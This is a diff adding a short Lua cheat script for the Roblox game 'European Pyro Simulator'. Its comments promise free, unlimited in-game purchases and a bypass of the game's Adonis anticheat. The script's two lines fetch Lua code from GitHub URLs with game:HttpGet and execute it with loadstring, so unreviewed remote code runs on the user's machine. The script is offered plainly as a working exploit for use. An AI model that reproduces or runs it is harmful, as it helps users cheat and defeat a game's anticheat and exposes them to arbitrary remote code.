@@ -1,0 +1,6 @@
+-- this script is for the roblox game European Pyro Simulator (january 2026 not patched), execute both loadstrings below and you can now buy anything for FREE and without XP, so you can buy everything and in infinite amounts, have fun! - made by Stefankshe 
+-- (also bypasses the ingame anticheat which is adonis and lets you comfortably use infinite yield)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/leakerscriptroblox/buildaboatfortreasure/main/EPS", true))()
